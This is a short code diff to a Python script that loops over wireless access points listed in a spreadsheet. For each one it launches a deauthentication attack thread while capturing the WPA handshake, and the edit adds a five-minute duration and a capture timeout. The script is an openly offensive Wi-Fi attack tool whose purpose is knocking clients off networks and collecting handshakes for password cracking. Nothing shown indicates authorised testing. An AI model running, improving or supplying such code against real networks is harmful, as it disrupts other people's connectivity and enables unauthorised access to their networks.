@@ -46,7 +46,8 @@ for row in ws.iter_rows(min_row=2, values_only=True):
     print(f"\n[*] Targeting AP: {ssid} ({bssid}) on channel {channel}")
 
     stop_event = threading.Event()
-    deauth_thread = threading.Thread(target=deauth_attack, args=(bssid, active_interface, stop_event))
+    duration = 300  # 5 minutes
+    deauth_thread = threading.Thread(target=deauth_attack, args=(bssid, active_interface, stop_event, duration))
     deauth_thread.start()
 
     cap_file = capture_handshake(
@@ -54,7 +55,8 @@ for row in ws.iter_rows(min_row=2, values_only=True):
         channel=channel,
         bssid=bssid,
         interface=active_interface,
-        stop_event=stop_event  # Pass the stop_event here
+        stop_event=stop_event,  # allows capture to stop when deauth finishes
+        timeout=duration        # ensure capture also stops after duration if no handshake
     )
     deauth_thread.join()
     print(f"[*] Finished with {ssid} ({bssid})")
